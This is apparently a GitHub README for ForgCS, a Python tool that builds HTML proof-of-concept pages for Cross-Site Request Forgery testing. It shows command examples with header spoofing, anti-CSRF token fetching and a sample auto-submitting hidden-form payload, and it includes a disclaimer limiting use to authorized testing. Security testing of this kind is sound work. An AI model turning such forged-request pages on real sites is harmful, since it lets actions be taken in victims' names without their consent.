 # ForgCS - CSRF Proof-of-Concept Generator

ForgCS is a command-line tool that generates HTML Proof-of-Concepts (PoCs) for testing Cross-Site Request Forgery (CSRF) vulnerabilities. It allows security testers to create realistic CSRF attack scenarios with customizable headers, tokens, and parameter handling, making it ideal for testing web application security.

## Features

- **Supports GET and POST requests**: Customize HTTP method to match the target endpoint.
- **Parameter Injection**: Accepts multiple parameters in `key=value` format.
- **Header Customization**: Specify `User-Agent` and `Referer` headers for more realistic testing.
- **Anti-CSRF Token Handling**: Fetches tokens dynamically from the target page if required.
- **Auto-Submission Toggle**: Automatically submit forms upon page load or require manual submission.
- **Output to HTML File**: Saves the generated PoC as an HTML file, ready for testing in the browser.

## Requirements

- **Python 3.x**
- **BeautifulSoup**: Install via `pip install beautifulsoup4`
- **Requests**: Install via `pip install requests`

## Installation

1. Clone this repository:
   ```bash
   git clone https://github.com/S2K7x/forgcs.git
   ```
2. Navigate to the ForgCS directory:
   ```bash
   cd forgcs
   ```

3. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

## Usage

ForgCS can be run with various command-line options to control the request method, parameters, headers, token handling, and form auto-submission.

### Basic Usage

```bash
python forgcs.py "https://target.com/vulnerable_endpoint" -p user=admin pass=1234
```

### Command-Line Options

| Option                | Description                                                                                           |
|-----------------------|-------------------------------------------------------------------------------------------------------|
| `url`                 | **(Required)** The target URL of the vulnerable endpoint.                                             |
| `-m`, `--method`      | HTTP method to use, either `GET` or `POST`. Default is `POST`.                                        |
| `-p`, `--params`      | Request parameters in `key=value` format. Multiple parameters are space-separated.                    |
| `--user-agent`        | Custom `User-Agent` header to simulate specific client requests.                                      |
| `--referer`           | Custom `Referer` header to simulate requests coming from a specific page.                             |
| `-t`, `--token`       | Name of the CSRF token field if one exists. ForgCS will attempt to fetch it from the target page.     |
| `--no-auto-submit`    | Disable auto-submission of the form, requiring the user to manually submit the CSRF PoC.              |
| `-o`, `--output`      | Specify the output filename for the generated HTML file. Defaults to `csrf_poc.html`.                 |

### Example Commands

#### Fetching Anti-CSRF Token

```bash
python forgcs.py "https://target.com/vulnerable_endpoint" -p user=admin pass=1234 -t csrf_token
```

#### Setting Custom Headers

```bash
python forgcs.py "https://target.com/vulnerable_endpoint" -p action=delete user_id=5678 \
    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
    --referer "https://target.com/login"
```

#### Disabling Auto-Submission

```bash
python forgcs.py "https://target.com/vulnerable_endpoint" -p action=update_profile email=test@example.com \
    --no-auto-submit
```

## Output

The tool generates an HTML file (default: `csrf_poc.html`) that can be opened in a browser to test CSRF vulnerabilities. The HTML form can either submit automatically or manually, based on the `--no-auto-submit` option.

## Example Output File

Below is an example of the HTML generated by ForgCS:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Enhanced CSRF PoC</title>
</head>
<body>
    <form id="csrfForm" action="https://target.com/vulnerable_endpoint" method="POST">
        <input type="hidden" name="user" value="admin">
        <input type="hidden" name="pass" value="1234">
        <input type="submit" value="Submit CSRF PoC">
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

## Security Disclaimer

ForgCS is intended solely for authorized security testing on web applications where explicit permission has been granted. Misuse of this tool against unauthorized targets may lead to legal repercussions.

## Contributing

1. Fork the repository.
2. Create a new branch: `git checkout -b feature-branch-name`.
3. Make your changes and commit: `git commit -m 'Add new feature'`.
4. Push to the branch: `git push origin feature-branch-name`.
5. Submit a pull request.

## License

ForgCS is open-source software licensed under the MIT License.
